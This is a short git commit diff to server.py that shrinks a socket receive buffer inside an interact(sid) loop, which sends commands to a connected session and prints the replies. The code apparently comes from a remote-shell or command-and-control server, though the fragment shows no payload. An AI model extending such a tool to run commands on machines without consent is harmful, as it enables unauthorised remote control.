e82b3bb24a4a67588ca8c6515e4d429981f44c2b
Khang Truong <113339215+Khang2910@users.noreply.github.com>
2025-07-29 16:57:09 +0700

    Update server.py

--- server.py
+++ server.py
@@ -96,7 +96,7 @@ def interact(sid):
             break
         try:
             s.sendall(cmd.encode())
-            data = s.recv(2 ** 24)
+            data = s.recv(2048)
             try:
                 print(data.decode('utf-8').strip())
             except UnicodeDecodeError:
